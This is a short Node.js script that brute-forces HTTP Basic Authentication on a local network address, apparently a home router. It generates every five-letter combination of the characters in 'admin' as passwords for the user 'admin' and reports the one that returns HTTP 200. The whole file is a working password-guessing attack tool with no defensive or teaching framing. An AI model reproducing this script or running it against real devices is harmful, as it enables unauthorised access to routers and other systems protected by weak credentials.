var http = require("http"),
	fs = require("fs"),
	result = {};

var option = {
	host: "192.168.2.1",
	port: 80,
	path: "/",
	method: "GET"
};

// var word = [0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n'];
	
var word = ['a', 'd', 'm', 'n', 'i'];
var queue = 0;

function crack (user, pwd, time) {
	var req;
	option.auth = user + ":" + pwd;
	req = http.request(option, function(res) {
		// console.log(pwd);
		if(res.statusCode == '200'){
			console.log('Done password is ' + pwd);
		}
	});
	req.on('error', function(e) {
		if(e.code == "ECONNRESET"){
			console.log(++queue);
		}
		console.log(e);
	});
	req.end();
}

function wordRecursion (word, len, result) {
	for (var i = 0; i < word.length; i++) {
		result[len] = word[i];
		if (len > 0) {
			arguments.callee(word, len - 1, result);
			continue;
		}
		crack("admin", result.join(""));
	}
}

function numMaker (len) {
	var pre = [];
	for (var i = 0; i < len; i++) {
		pre.push(word[0]);
	}
	wordRecursion(word, len - 1, pre)
}

numMaker(5);